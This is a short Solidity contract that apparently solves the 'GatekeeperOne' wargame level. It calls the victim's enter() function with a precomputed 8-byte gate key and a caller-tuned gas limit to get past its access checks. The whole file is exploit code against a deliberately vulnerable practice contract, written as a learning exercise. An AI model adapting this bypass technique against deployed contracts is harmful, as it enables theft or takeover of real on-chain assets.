// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IGateKeeperOne {

  function enter(bytes8 _gateKey) external returns (bool);
}


contract AttackerGatekeeperOne{

    IGateKeeperOne victim;
    // gateKey determined with analysis of the gate3
    bytes8 gateKey = 0x100000000000FC7C;

    constructor(address _victim) {
        victim = IGateKeeperOne(_victim);
    }

    function attack(uint g) public {
        //Gas limit determined with hardhat console.log(gasleft())
        require(victim.enter{gas:g}(gateKey),"Didn't work");
    }
}